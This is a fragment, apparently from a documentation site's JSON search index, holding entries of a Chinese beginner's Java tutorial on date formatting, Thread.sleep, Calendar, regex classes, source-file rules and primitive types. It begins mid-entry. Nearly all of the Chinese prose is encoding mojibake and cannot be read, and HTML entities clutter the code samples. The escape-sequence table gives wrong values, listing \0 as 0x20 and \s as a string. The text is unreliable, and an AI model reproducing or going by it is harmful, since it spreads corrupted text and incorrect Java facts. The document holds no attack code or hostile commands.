¼å¼æ¥è¿è¡Œã€‚ä¾‹å¦‚ï¼š\nimport java.util.*; import java.text.*;  public class DateDemo {  public static void main(String args[]) {   Date dNow = new Date( );  SimpleDateFormat ft = new SimpleDateFormat (\u0026#34;yyyy-MM-dd hh:mm:ss\u0026#34;);   System.out.println(\u0026#34;å½“å‰æ—¶é—´ä¸º: \u0026#34; + ft.format(dNow));  } } æ—¥æœŸå’Œæ—¶é—´çš„æ ¼å¼åŒ–ç¼–ç  #  æ—¶é—´æ¨¡å¼å­—ç¬¦ä¸²ç”¨æ¥æŒ‡å®šæ—¶é—´æ ¼å¼ã€‚åœ¨æ­¤æ¨¡å¼ä¸­ï¼Œæ‰€æœ‰çš„ ASCII å­—æ¯è¢«ä¿ç•™ä¸ºæ¨¡å¼å­—æ¯ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š\n   å­—æ¯ æè¿° ç¤ºä¾‹     G çºªå…ƒæ ‡è®° AD   y å››ä½å¹´ä»½ 2001   M æœˆä»½ July or 07   d ä¸€ä¸ªæœˆçš„æ—¥æœŸ 10   h A.M./P.M. (1~12)æ ¼å¼å°æ—¶ 12   H ä¸€å¤©ä¸­çš„å°æ—¶ (0~23) 22   m åˆ†é’Ÿæ•° 30   s ç§’æ•° 55   S æ¯«ç§’æ•° 234   E æ˜ŸæœŸå‡  Tuesday   D ä¸€å¹´ä¸­çš„æ—¥å­ 360   F ä¸€ä¸ªæœˆä¸­ç¬¬å‡ å‘¨çš„å‘¨å‡  2 (second Wed. in July)   w ä¸€å¹´ä¸­ç¬¬å‡ å‘¨ 40   W ä¸€ä¸ªæœˆä¸­ç¬¬å‡ å‘¨ 1   a A.M./P.M. æ ‡è®° PM   k ä¸€å¤©ä¸­çš„å°æ—¶(1~24) 24   K A.M./P.M. (0~11)æ ¼å¼å°æ—¶ 10   z æ—¶åŒº Eastern Standard Time   ' æ–‡å­—å®šç•Œç¬¦ Delimiter   \u0026quot; å•å¼•å· `    ä½¿ç”¨ printf æ ¼å¼åŒ–æ—¥æœŸ #  printf æ–¹æ³•å¯ä»¥å¾ˆè½»æ¾åœ°æ ¼å¼åŒ–æ—¶é—´å’Œæ—¥æœŸã€‚ä½¿ç”¨ä¸¤ä¸ªå­—æ¯æ ¼å¼ï¼Œå®ƒä»¥ %t å¼€å¤´å¹¶ä¸”ä»¥ä¸‹é¢è¡¨æ ¼ä¸­çš„ä¸€ä¸ªå­—æ¯ç»“å°¾ã€‚\n   è½¬ æ¢ ç¬¦ è¯´ æ˜ ç¤º ä¾‹     c åŒ…æ‹¬å…¨éƒ¨æ—¥æœŸå’Œæ—¶é—´ä¿¡æ¯ æ˜ŸæœŸå…­ åæœˆ 27 14:21:20 CST 2007   F \u0026ldquo;å¹´-æœˆ-æ—¥\u0026quot;æ ¼å¼ 2007-10-27   D \u0026ldquo;æœˆ/æ—¥/å¹´\u0026quot;æ ¼å¼ 10/27/07   r \u0026ldquo;HH:MM:SS PM\u0026quot;æ ¼å¼ï¼ˆ12æ—¶åˆ¶ï¼‰ 02:25:51 ä¸‹åˆ   T \u0026ldquo;HH:MM:SS\u0026quot;æ ¼å¼ï¼ˆ24æ—¶åˆ¶ï¼‰ 14:28:16   R \u0026ldquo;HH:MM\u0026quot;æ ¼å¼ï¼ˆ24æ—¶åˆ¶ï¼‰ 14:28    æ›´å¤š printf è§£æå¯ä»¥å‚è§ï¼šJava æ ¼å¼åŒ–è¾“å‡º printf ä¾‹å­\nè§£æå­—ç¬¦ä¸²ä¸ºæ—¶é—´ #  SimpleDateFormat ç±»æœ‰ä¸€äº›é™„åŠ çš„æ–¹æ³•ï¼Œç‰¹åˆ«æ˜¯ parse()ï¼Œå®ƒè¯•å›¾æŒ‰ç…§ç»™å®šçš„ SimpleDateFormat å¯¹è±¡çš„æ ¼å¼åŒ–å­˜å‚¨æ¥è§£æå­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼š\nimport java.util.*; import java.text.*;  public class DateDemo {   public static void main(String args[]) {  SimpleDateFormat ft = new SimpleDateFormat (\u0026#34;yyyy-MM-dd\u0026#34;);   String input = args.length == 0 ? \u0026#34;1818-11-11\u0026#34; : args[0];   System.out.print(input + \u0026#34; Parses as \u0026#34;);   Date t;   try {  t = ft.parse(input);  System.out.println(t);  } catch (ParseException e) {  System.out.println(\u0026#34;Unparseable using \u0026#34; + ft);  }  } } JAVA ä¼‘çœ  #  sleep() ä½¿å½“å‰çº¿ç¨‹è¿›å…¥åœæ»çŠ¶æ€ï¼ˆé˜»å¡å½“å‰çº¿ç¨‹ï¼‰ï¼Œè®©å‡º CPU çš„ä½¿ç”¨ã€ç›®çš„æ˜¯ä¸è®©å½“å‰çº¿ç¨‹ç‹¬è‡ªéœ¸å è¯¥è¿›ç¨‹æ‰€è·çš„ CPU èµ„æºï¼Œä»¥ç•™ä¸€å®šæ—¶é—´ç»™å…¶ä»–çº¿ç¨‹æ‰§è¡Œçš„æœºä¼šã€‚\nä½ å¯ä»¥è®©ç¨‹åºä¼‘çœ ä¸€æ¯«ç§’çš„æ—¶é—´æˆ–è€…åˆ°æ‚¨çš„è®¡ç®—æœºçš„å¯¿å‘½é•¿çš„ä»»æ„æ®µæ—¶é—´ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢çš„ç¨‹åºä¼šä¼‘çœ  3 ç§’ï¼š\nimport java.util.*;  public class SleepDemo {  public static void main(String args[]) {  try {  System.out.println(new Date( ) + \u0026#34;\\n\u0026#34;);  Thread.sleep(1000*3); // ä¼‘çœ 3ç§’  System.out.println(new Date( ) + \u0026#34;\\n\u0026#34;);  } catch (Exception e) {  System.out.println(\u0026#34;Got an exception!\u0026#34;);  }  } } æµ‹é‡æ—¶é—´ #  ä¸‹é¢çš„ä¸€ä¸ªä¾‹å­è¡¨æ˜å¦‚ä½•æµ‹é‡æ—¶é—´é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ï¼š\nimport java.util.*;  public class DiffDemo {   public static void main(String args[]) {  try {  long start = System.currentTimeMillis( );  System.out.println(new Date( ) + \u0026#34;\\n\u0026#34;);  Thread.sleep(5*60*10);  System.out.println(new Date( ) + \u0026#34;\\n\u0026#34;);  long end = System.currentTimeMillis( );  long diff = end - start;  System.out.println(\u0026#34;Difference is : \u0026#34; + diff);  } catch (Exception e) {  System.out.println(\u0026#34;Got an exception!\u0026#34;);  }  } } Calendar #  Calendarç±»çš„åŠŸèƒ½è¦æ¯”Dateç±»å¼ºå¤§å¾ˆå¤šï¼Œè€Œä¸”åœ¨å®ç°æ–¹å¼ä¸Šä¹Ÿæ¯”Dateç±»è¦å¤æ‚ä¸€äº›ã€‚\nCalendar ç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œåœ¨å®é™…ä½¿ç”¨æ—¶å®ç°ç‰¹å®šçš„å­ç±»çš„å¯¹è±¡ï¼Œåˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹å¯¹ç¨‹åºå‘˜æ¥è¯´æ˜¯é€æ˜çš„ï¼Œåªéœ€è¦ä½¿ç”¨ getInstance æ–¹æ³•åˆ›å»ºå³å¯ã€‚\nåˆ›å»ºå¯¹è±¡ #  å½“å‰æ—¥æœŸçš„å¯¹è±¡ï¼š\nCalendar c = Calendar.getInstance(); //é»˜è®¤æ˜¯å½“å‰æ—¥æœŸ åˆ›å»ºä¸€ä¸ªæŒ‡å®šæ—¥æœŸçš„å¯¹è±¡ï¼š\n// åˆ›å»ºä¸€ä¸ªä»£è¡¨ 2009 å¹´ 6 æœˆ 12 æ—¥çš„ Calendar å¯¹è±¡ Calendar c1 = Calendar.getInstance(); c1.set(2009, 6 - 1, 12); å¯¹è±¡å­—æ®µç±»å‹ #  Calendar ç±»ä¸­ç”¨ä»¥ä¸‹è¿™äº›å¸¸é‡è¡¨ç¤ºä¸åŒçš„æ„ä¹‰ï¼Œjdk å†…çš„å¾ˆå¤šç±»å…¶å®éƒ½æ˜¯é‡‡ç”¨çš„è¿™ç§æ€æƒ³\n   å¸¸é‡ æè¿°     Calendar.YEAR å¹´ä»½   Calendar.MONTH æœˆä»½   Calendar.DATE æ—¥æœŸ   Calendar.DAY_OF_MONTH æ—¥æœŸï¼Œå’Œä¸Šé¢çš„å­—æ®µæ„ä¹‰å®Œå…¨ç›¸åŒ   Calendar.HOUR 12å°æ—¶åˆ¶çš„å°æ—¶   Calendar.HOUR_OF_DAY 24å°æ—¶åˆ¶çš„å°æ—¶   Calendar.MINUTE åˆ†é’Ÿ   Calendar.SECOND ç§’   Calendar.DAY_OF_WEEK æ˜ŸæœŸå‡     å¯¹è±¡ç±»å‹çš„è®¾ç½® #  set æ–¹æ³•çš„ä¸¤ä¸ªå‡½æ•°åŸå‹ï¼š\npublic final void set(int year,int month,int date);  public void set(int field,int value); è¿˜å¯ä»¥ä½¿ç”¨ add æ–¹æ³•ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\nc1.set(Calendar.DATE,10); // æŠŠ c1 å¯¹è±¡ä»£è¡¨çš„æ—¥æœŸè®¾ç½®ä¸º 10 å·ï¼Œå…¶å®ƒæ‰€æœ‰çš„æ•°å€¼ä¼šè¢«é‡æ–°è®¡ç®— GregorianCalendar ç±» #  Calendar ç±»å®ç°äº†å…¬å†æ—¥å†ï¼ŒGregorianCalendar æ˜¯ Calendar ç±»çš„ä¸€ä¸ªå…·ä½“å®ç°ã€‚\nCalendar çš„ getInstance() æ–¹æ³•è¿”å›ä¸€ä¸ªé»˜è®¤ç”¨å½“å‰çš„è¯­è¨€ç¯å¢ƒå’Œæ—¶åŒºåˆå§‹åŒ–çš„ GregorianCalendar å¯¹è±¡ã€‚GregorianCalendar å®šä¹‰äº†ä¸¤ä¸ªå­—æ®µï¼šAD å’Œ BCã€‚è¿™æ˜¯ä»£è¡¨å…¬å†å®šä¹‰çš„ä¸¤ä¸ªæ—¶ä»£ã€‚\n"},{"id":54,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/15.%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"15.æ­£åˆ™è¡¨è¾¾å¼","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"æ­£åˆ™è¡¨è¾¾å¼ #  java.util.regex åŒ…ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªç±»ï¼š\n  Pattern ç±»ï¼š\npattern å¯¹è±¡æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç¼–è¯‘è¡¨ç¤ºã€‚Pattern ç±»æ²¡æœ‰å…¬å…±æ„é€ æ–¹æ³•ã€‚è¦åˆ›å»ºä¸€ä¸ª Pattern å¯¹è±¡ï¼Œä½ å¿…é¡»é¦–å…ˆè°ƒç”¨å…¶å…¬å…±é™æ€ç¼–è¯‘æ–¹æ³•ï¼Œå®ƒè¿”å›ä¸€ä¸ª Pattern å¯¹è±¡ã€‚è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä½œä¸ºå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚\n  Matcher ç±»ï¼š\nMatcher å¯¹è±¡æ˜¯å¯¹è¾“å…¥å­—ç¬¦ä¸²è¿›è¡Œè§£é‡Šå’ŒåŒ¹é…æ“ä½œçš„å¼•æ“ã€‚ä¸Pattern ç±»ä¸€æ ·ï¼ŒMatcher ä¹Ÿæ²¡æœ‰å…¬å…±æ„é€ æ–¹æ³•ã€‚ä½ éœ€è¦è°ƒç”¨ Pattern å¯¹è±¡çš„ matcher æ–¹æ³•æ¥è·å¾—ä¸€ä¸ª Matcher å¯¹è±¡ã€‚\n  PatternSyntaxExceptionï¼š\nPatternSyntaxException æ˜¯ä¸€ä¸ªéå¼ºåˆ¶å¼‚å¸¸ç±»ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­çš„è¯­æ³•é”™è¯¯ã€‚\n  "},{"id":55,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/2.%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%B1%BB/","title":"2.å¯¹è±¡å’Œç±»","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"å¯¹è±¡å’Œç±» #  Javaä½œä¸ºä¸€ç§é¢å‘å¯¹è±¡è¯­è¨€ã€‚æ”¯æŒä»¥ä¸‹åŸºæœ¬æ¦‚å¿µï¼šå¤šæ€ã€ç»§æ‰¿ã€å°è£…ã€æŠ½è±¡ã€ç±»ã€å¯¹è±¡ã€å®ä¾‹ã€æ–¹æ³•ã€é‡è½½ã€‚\næ„é€ æ–¹æ³•ï¼Œæˆå‘˜å®šä¹‰è°ƒç”¨ç­‰ï¼Œå‡ä¸ C++ ç±»ä¼¼ã€‚\næºæ–‡ä»¶å£°æ˜è§„åˆ™ #  åœ¨æœ¬èŠ‚çš„æœ€åéƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†å­¦ä¹ æºæ–‡ä»¶çš„å£°æ˜è§„åˆ™ã€‚å½“åœ¨ä¸€ä¸ªæºæ–‡ä»¶ä¸­å®šä¹‰å¤šä¸ªç±»ï¼Œå¹¶ä¸”è¿˜æœ‰ import è¯­å¥å’Œpackageè¯­å¥æ—¶ï¼Œè¦ç‰¹åˆ«æ³¨æ„è¿™äº›è§„åˆ™ã€‚\n ä¸€ä¸ªæºæ–‡ä»¶ä¸­åªèƒ½æœ‰ä¸€ä¸ª public ç±» ä¸€ä¸ªæºæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªé public ç±» æºæ–‡ä»¶çš„åç§°åº”è¯¥å’Œ public ç±»çš„ç±»åä¿æŒä¸€è‡´ã€‚ä¾‹å¦‚ï¼šæºæ–‡ä»¶ä¸­ public ç±»çš„ç±»åæ˜¯ Employeeï¼Œé‚£ä¹ˆæºæ–‡ä»¶åº”è¯¥å‘½åä¸º Employee.javaã€‚ å¦‚æœä¸€ä¸ªç±»å®šä¹‰åœ¨æŸä¸ªåŒ…ä¸­ï¼Œé‚£ä¹ˆ package è¯­å¥åº”è¯¥åœ¨æºæ–‡ä»¶çš„é¦–è¡Œã€‚ å¦‚æœæºæ–‡ä»¶åŒ…å« import è¯­å¥ï¼Œé‚£ä¹ˆåº”è¯¥æ”¾åœ¨ package è¯­å¥å’Œç±»å®šä¹‰ä¹‹é—´ã€‚å¦‚æœæ²¡æœ‰ package è¯­å¥ï¼Œé‚£ä¹ˆ import è¯­å¥åº”è¯¥åœ¨æºæ–‡ä»¶ä¸­æœ€å‰é¢ã€‚ import è¯­å¥å’Œ package è¯­å¥å¯¹æºæ–‡ä»¶ä¸­å®šä¹‰çš„æ‰€æœ‰ç±»éƒ½æœ‰æ•ˆã€‚åœ¨åŒä¸€æºæ–‡ä»¶ä¸­ï¼Œä¸èƒ½ç»™ä¸åŒçš„ç±»ä¸åŒçš„åŒ…å£°æ˜ã€‚  ç±»æœ‰è‹¥å¹²ç§è®¿é—®çº§åˆ«ï¼Œå¹¶ä¸”ç±»ä¹Ÿåˆ†ä¸åŒçš„ç±»å‹ï¼šæŠ½è±¡ç±»å’Œ final ç±»ç­‰ã€‚è¿™äº›å°†åœ¨è®¿é—®æ§åˆ¶ç« èŠ‚ä»‹ç»ã€‚\né™¤äº†ä¸Šé¢æåˆ°çš„å‡ ç§ç±»å‹ï¼ŒJavaè¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„ç±»ï¼Œå¦‚ï¼šå†…éƒ¨ç±»ã€åŒ¿åç±»ã€‚\nJAVAåŒ… #  Import è¯­å¥ #  åœ¨Javaä¸­ï¼Œå¦‚æœç»™å‡ºä¸€ä¸ªå®Œæ•´çš„é™å®šåï¼ŒåŒ…æ‹¬åŒ…åã€ç±»åï¼Œé‚£ä¹ˆJavaç¼–è¯‘å™¨å°±å¯ä»¥å¾ˆå®¹æ˜“åœ°å®šä½åˆ°æºä»£ç æˆ–è€…ç±»ã€‚Importè¯­å¥å°±æ˜¯ç”¨æ¥æä¾›ä¸€ä¸ªåˆç†çš„è·¯å¾„ï¼Œä½¿å¾—ç¼–è¯‘å™¨å¯ä»¥æ‰¾åˆ°æŸä¸ªç±»ã€‚\nä¾‹å¦‚ï¼Œä¸‹é¢çš„å‘½ä»¤è¡Œå°†ä¼šå‘½ä»¤ç¼–è¯‘å™¨è½½å…¥ java_installation/java/io è·¯å¾„ä¸‹çš„æ‰€æœ‰ç±»\nimport java.io.*; "},{"id":56,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","title":"3.åŸºæœ¬æ•°æ®ç±»å‹","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"åŸºæœ¬æ•°æ®ç±»å‹ #  Java çš„ä¸¤å¤§æ•°æ®ç±»å‹:\n å†…ç½®æ•°æ®ç±»å‹ å¼•ç”¨æ•°æ®ç±»å‹  å†…ç½®æ•°æ®ç±»å‹ #  Javaè¯­è¨€æä¾›äº†å…«ç§åŸºæœ¬ç±»å‹ã€‚å…­ç§æ•°å­—ç±»å‹ï¼ˆå››ä¸ªæ•´æ•°å‹ï¼Œä¸¤ä¸ªæµ®ç‚¹å‹ï¼‰ï¼Œä¸€ç§å­—ç¬¦ç±»å‹ï¼Œè¿˜æœ‰ä¸€ç§å¸ƒå°”å‹ã€‚\nbyteï¼š\n byte æ•°æ®ç±»å‹æ˜¯8ä½ã€æœ‰ç¬¦å·çš„ï¼Œä»¥äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æ•´æ•°ï¼› æœ€å°å€¼æ˜¯ -128ï¼ˆ-2^7ï¼‰ï¼› æœ€å¤§å€¼æ˜¯ 127ï¼ˆ2^7-1ï¼‰ï¼› é»˜è®¤å€¼æ˜¯ 0ï¼› byte ç±»å‹ç”¨åœ¨å¤§å‹æ•°ç»„ä¸­èŠ‚çº¦ç©ºé—´ï¼Œä¸»è¦ä»£æ›¿æ•´æ•°ï¼Œå› ä¸º byte å˜é‡å ç”¨çš„ç©ºé—´åªæœ‰ int ç±»å‹çš„å››åˆ†ä¹‹ä¸€ï¼› ä¾‹å­ï¼šbyte a = 100ï¼Œbyte b = -50ã€‚  shortï¼š\n short æ•°æ®ç±»å‹æ˜¯ 16 ä½ã€æœ‰ç¬¦å·çš„ä»¥äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æ•´æ•° æœ€å°å€¼æ˜¯ -32768ï¼ˆ-2^15ï¼‰ï¼› æœ€å¤§å€¼æ˜¯ 32767ï¼ˆ2^15 - 1ï¼‰ï¼› Short æ•°æ®ç±»å‹ä¹Ÿå¯ä»¥åƒ byte é‚£æ ·èŠ‚çœç©ºé—´ã€‚ä¸€ä¸ªshortå˜é‡æ˜¯intå‹å˜é‡æ‰€å ç©ºé—´çš„äºŒåˆ†ä¹‹ä¸€ï¼› é»˜è®¤å€¼æ˜¯ 0ï¼› ä¾‹å­ï¼šshort s = 1000ï¼Œshort r = -20000ã€‚  intï¼š\n int æ•°æ®ç±»å‹æ˜¯32ä½ã€æœ‰ç¬¦å·çš„ä»¥äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æ•´æ•°ï¼› æœ€å°å€¼æ˜¯ -2,147,483,648ï¼ˆ-2^31ï¼‰ï¼› æœ€å¤§å€¼æ˜¯ 2,147,483,647ï¼ˆ2^31 - 1ï¼‰ï¼› ä¸€èˆ¬åœ°æ•´å‹å˜é‡é»˜è®¤ä¸º int ç±»å‹ï¼› é»˜è®¤å€¼æ˜¯ 0 ï¼› ä¾‹å­ï¼šint a = 100000, int b = -200000ã€‚  longï¼š\n long æ•°æ®ç±»å‹æ˜¯ 64 ä½ã€æœ‰ç¬¦å·çš„ä»¥äºŒè¿›åˆ¶è¡¥ç è¡¨ç¤ºçš„æ•´æ•°ï¼› æœ€å°å€¼æ˜¯ -9,223,372,036,854,775,808ï¼ˆ-2^63ï¼‰ï¼› æœ€å¤§å€¼æ˜¯ 9,223,372,036,854,775,807ï¼ˆ2^63 -1ï¼‰ï¼› è¿™ç§ç±»å‹ä¸»è¦ä½¿ç”¨åœ¨éœ€è¦æ¯”è¾ƒå¤§æ•´æ•°çš„ç³»ç»Ÿä¸Šï¼› é»˜è®¤å€¼æ˜¯ 0Lï¼› ä¾‹å­ï¼š long a = 100000Lï¼ŒLong b = -200000Lã€‚ \u0026ldquo;L\u0026quot;ç†è®ºä¸Šä¸åˆ†å¤§å°å†™ï¼Œä½†æ˜¯è‹¥å†™æˆ\u0026quot;l\u0026quot;å®¹æ˜“ä¸æ•°å­—\u0026quot;1\u0026quot;æ··æ·†ï¼Œä¸å®¹æ˜“åˆ†è¾©ã€‚æ‰€ä»¥æœ€å¥½å¤§å†™ã€‚  floatï¼š\n float æ•°æ®ç±»å‹æ˜¯å•ç²¾åº¦ã€32ä½ã€ç¬¦åˆIEEE 754æ ‡å‡†çš„æµ®ç‚¹æ•°ï¼› float åœ¨å‚¨å­˜å¤§å‹æµ®ç‚¹æ•°ç»„çš„æ—¶å€™å¯èŠ‚çœå†…å­˜ç©ºé—´ï¼› é»˜è®¤å€¼æ˜¯ 0.0fï¼› æµ®ç‚¹æ•°ä¸èƒ½ç”¨æ¥è¡¨ç¤ºç²¾ç¡®çš„å€¼ï¼Œå¦‚è´§å¸ï¼› ä¾‹å­ï¼šfloat f1 = 234.5fã€‚  doubleï¼š\n double æ•°æ®ç±»å‹æ˜¯åŒç²¾åº¦ã€64 ä½ã€ç¬¦åˆIEEE 754æ ‡å‡†çš„æµ®ç‚¹æ•°ï¼› æµ®ç‚¹æ•°çš„é»˜è®¤ç±»å‹ä¸ºdoubleç±»å‹ï¼› doubleç±»å‹åŒæ ·ä¸èƒ½è¡¨ç¤ºç²¾ç¡®çš„å€¼ï¼Œå¦‚è´§å¸ï¼› é»˜è®¤å€¼æ˜¯ 0.0dï¼› ä¾‹å­ï¼šdouble d1 = 123.4ã€‚  booleanï¼š\n booleanæ•°æ®ç±»å‹è¡¨ç¤ºä¸€ä½çš„ä¿¡æ¯ï¼› åªæœ‰ä¸¤ä¸ªå–å€¼ï¼štrue å’Œ falseï¼› è¿™ç§ç±»å‹åªä½œä¸ºä¸€ç§æ ‡å¿—æ¥è®°å½• true/false æƒ…å†µï¼› é»˜è®¤å€¼æ˜¯ falseï¼› ä¾‹å­ï¼šboolean one = trueã€‚  charï¼š\n charç±»å‹æ˜¯ä¸€ä¸ªå•ä¸€çš„ 16 ä½ Unicode å­—ç¬¦ï¼› æœ€å°å€¼æ˜¯ \\u0000ï¼ˆå³ä¸º0ï¼‰ï¼› æœ€å¤§å€¼æ˜¯ \\uffffï¼ˆå³ä¸º65,535ï¼‰ï¼› char æ•°æ®ç±»å‹å¯ä»¥å‚¨å­˜ä»»ä½•å­—ç¬¦ï¼› ä¾‹å­ï¼šchar letter = \u0026lsquo;A\u0026rsquo;;ã€‚  å¯¹äºæ•°å€¼ç±»å‹çš„åŸºæœ¬ç±»å‹çš„å–å€¼èŒƒå›´ï¼Œæˆ‘ä»¬æ— éœ€å¼ºåˆ¶å»è®°å¿†ï¼Œå› ä¸ºå®ƒä»¬çš„å€¼éƒ½å·²ç»ä»¥å¸¸é‡çš„å½¢å¼å®šä¹‰åœ¨å¯¹åº”çš„åŒ…è£…ç±»ä¸­äº†ã€‚è¯·çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š\npublic class PrimitiveTypeTest {  public static void main(String[] args) {  // byte  System.out.println(\u0026#34;åŸºæœ¬ç±»å‹ï¼šbyte äºŒè¿›åˆ¶ä½æ•°ï¼š\u0026#34; + Byte.SIZE);  System.out.println(\u0026#34;åŒ…è£…ç±»ï¼šjava.lang.Byte\u0026#34;);  System.out.println(\u0026#34;æœ€å°å€¼ï¼šByte.MIN_VALUE=\u0026#34; + Byte.MIN_VALUE);  System.out.println(\u0026#34;æœ€å¤§å€¼ï¼šByte.MAX_VALUE=\u0026#34; + Byte.MAX_VALUE);  System.out.println();  ...  } } å¼•ç”¨æ•°æ®ç±»å‹ #    åœ¨ Java ä¸­ï¼Œå¼•ç”¨ç±»å‹çš„å˜é‡éå¸¸ç±»ä¼¼äº C/C++ çš„æŒ‡é’ˆã€‚å¼•ç”¨ç±»å‹æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼ŒæŒ‡å‘å¯¹è±¡çš„å˜é‡æ˜¯å¼•ç”¨å˜é‡ã€‚è¿™äº›å˜é‡åœ¨å£°æ˜æ—¶è¢«æŒ‡å®šä¸ºä¸€ä¸ªç‰¹å®šçš„ç±»å‹ï¼Œæ¯”å¦‚ Employeeã€Puppy ç­‰ã€‚å˜é‡ä¸€æ—¦å£°æ˜åï¼Œç±»å‹å°±ä¸èƒ½è¢«æ”¹å˜äº†ã€‚\n  å¯¹è±¡ã€æ•°ç»„éƒ½æ˜¯å¼•ç”¨æ•°æ®ç±»å‹ã€‚\n  æ‰€æœ‰å¼•ç”¨ç±»å‹çš„é»˜è®¤å€¼éƒ½æ˜¯ nullã€‚\n  ä¸€ä¸ªå¼•ç”¨å˜é‡å¯ä»¥ç”¨æ¥å¼•ç”¨ä»»ä½•ä¸ä¹‹å…¼å®¹çš„ç±»å‹ã€‚\n  ä¾‹å­ï¼š\nSite site = new Site(\u0026#34;Runoob\u0026#34;);   Java å¸¸é‡ #  å¸¸é‡åœ¨ç¨‹åºè¿è¡Œæ—¶æ˜¯ä¸èƒ½è¢«ä¿®æ”¹çš„ã€‚\nåœ¨ Java ä¸­ä½¿ç”¨ final å…³é”®å­—æ¥ä¿®é¥°å¸¸é‡ï¼Œå£°æ˜æ–¹å¼å’Œå˜é‡ç±»ä¼¼ï¼š\nfinal double PI = 3.1415927; è™½ç„¶å¸¸é‡åä¹Ÿå¯ä»¥ç”¨å°å†™ï¼Œä½†ä¸ºäº†ä¾¿äºè¯†åˆ«ï¼Œé€šå¸¸ä½¿ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºå¸¸é‡ã€‚\nå­—é¢é‡å¯ä»¥èµ‹ç»™ä»»ä½•å†…ç½®ç±»å‹çš„å˜é‡ã€‚ä¾‹å¦‚ï¼š\nbyte a = 68; char a = \u0026#39;A\u0026#39;; byteã€intã€longã€å’Œ short éƒ½å¯ä»¥ç”¨åè¿›åˆ¶ã€16 è¿›åˆ¶ä»¥åŠ 8 è¿›åˆ¶çš„æ–¹å¼æ¥è¡¨ç¤ºã€‚\nå½“ä½¿ç”¨å¸¸é‡çš„æ—¶å€™ï¼Œå‰ç¼€ 0 è¡¨ç¤º 8 è¿›åˆ¶ï¼Œè€Œå‰ç¼€ 0x ä»£è¡¨ 16 è¿›åˆ¶, ä¾‹å¦‚ï¼š\nint decimal = 100; int octal = 0144; int hexa = 0x64; å’Œå…¶ä»–è¯­è¨€ä¸€æ ·ï¼ŒJavaçš„å­—ç¬¦ä¸²å¸¸é‡ä¹Ÿæ˜¯åŒ…å«åœ¨ä¸¤ä¸ªå¼•å·ä¹‹é—´çš„å­—ç¬¦åºåˆ—ã€‚ä¸‹é¢æ˜¯å­—ç¬¦ä¸²å‹å­—é¢é‡çš„ä¾‹å­ï¼š\n\u0026#34;Hello World\u0026#34; \u0026#34;two\\nlines\u0026#34; \u0026#34;\\\u0026#34;This is in quotes\\\u0026#34;\u0026#34; å­—ç¬¦ä¸²å¸¸é‡å’Œå­—ç¬¦å¸¸é‡éƒ½å¯ä»¥åŒ…å«ä»»ä½•Unicodeå­—ç¬¦ã€‚ä¾‹å¦‚ï¼š\nchar a = \u0026#39;\\u0001\u0026#39;; String a = \u0026#34;\\u0001\u0026#34;; Javaè¯­è¨€æ”¯æŒä¸€äº›ç‰¹æ®Šçš„è½¬ä¹‰å­—ç¬¦åºåˆ—ã€‚\n   ç¬¦å· å­—ç¬¦å«ä¹‰     \\n æ¢è¡Œ (0x0a)   \\r å›è½¦ (0x0d)   \\f æ¢é¡µç¬¦(0x0c)   \\b é€€æ ¼ (0x08)   \\0 ç©ºå­—ç¬¦ (0x20)   \\s å­—ç¬¦ä¸²   \\t åˆ¶è¡¨ç¬¦   \\\u0026quot; åŒå¼•å·   \\' å•å¼•å·   \\\\ åæ–œæ    \\ddd å…«è¿›åˆ¶å­—ç¬¦ (ddd)   \\uxxxx 16è¿›åˆ¶Unicodeå­—ç¬¦ (xxxx)    è‡ªåŠ¨ç±»å‹è½¬æ¢ #  æ•´å‹ã€å®å‹ï¼ˆå¸¸é‡ï¼‰ã€å­—ç¬¦å‹æ•°æ®å¯ä»¥æ··åˆè¿ç®—ã€‚è¿ç®—ä¸­ï¼Œä¸åŒç±»å‹çš„æ•°æ®å…ˆè½¬åŒ–ä¸ºåŒä¸€ç±»å‹ï¼Œç„¶åè¿›è¡Œè¿ç®—ã€‚\nè½¬æ¢ä»ä½çº§åˆ°é«˜çº§ã€‚\nä½ ------------------------------------\u0026gt; é«˜ byte,short,charâ€”\u0026gt; int â€”\u0026gt; longâ€”\u0026gt; float â€”\u0026gt; double 